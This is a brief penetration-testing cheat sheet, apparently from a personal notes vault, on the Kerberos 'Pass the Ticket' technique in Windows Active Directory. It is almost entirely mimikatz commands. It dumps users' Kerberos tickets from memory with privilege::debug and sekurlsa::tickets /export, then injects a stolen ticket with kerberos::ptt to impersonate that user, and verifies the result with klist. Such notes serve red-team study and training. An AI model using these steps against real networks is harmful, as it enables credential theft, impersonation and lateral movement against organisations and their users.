---
id: Pass the Ticket
aliases:
  - Pass the Ticket
tags:
  - windows
  - AD
  - kerberos
  - lateral
---
Steal a user's auth ticket and use it to impersonate the user.
## With mimikatz.exe

1. In mimikatz:
```mimikatz
privilege::debug
sekurlsa::tickets /export
exit
```

2. Check generated tickets with `dir *.kirbi`

3. In mimikatz:
```mimikatz
kerberos::ptt $TICKET.kirbi
exit
```

4. Check that the ticket was created with `klist`
